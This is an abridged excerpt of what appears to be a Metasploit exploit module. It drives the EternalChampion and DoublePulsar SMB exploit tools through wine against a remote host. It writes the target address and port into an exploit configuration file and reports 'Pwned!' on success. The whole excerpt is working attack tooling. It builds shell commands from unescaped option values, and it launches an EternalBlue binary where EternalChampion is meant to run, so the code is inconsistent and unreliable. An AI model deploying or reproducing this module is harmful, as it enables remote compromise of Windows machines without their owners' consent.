...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize(info = {})
	...
	register_options([
		...
		OptString.new('ETERNALCHAMPIONPATH',[true,'Path directory of EternalChampion','/root/EternalChampion-Doublepulsar-Metasploit/deps/']),
		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/root/EternalChampion-Doublepulsar-Metasploit/deps/']),
  ...
  print_status('Generating EternalChampion XML data')
  cp = `cp #{datastore['ETERNALCHAMPIONPATH']}/Eternalchampion-2.0.0.Skeleton.xml #{datastore['ETERNALCHAMPIONPATH']}/Eternalchampion-2.0.0.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ETERNALCHAMPIONPATH']}/Eternalchampion-2.0.0.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ETERNALCHAMPIONPATH']}/Eternalchampion-2.0.0.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ETERNALCHAMPIONPATH']}/Eternalchampion-2.0.0.xml`
  ...
  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['ETERNALCHAMPIONPATH']}/Eternalchampion-2.0.0.xml`
  ...
  print_status('Launching EternalChampian...')
  output = `cd #{datastore['ETERNALCHAMPIONPATH']}; wine Eternalblue-2.2.0.exe`
  if output =~ /=-=-WIN-=-=/
  	print_good("Pwned! EternalChampion success!")
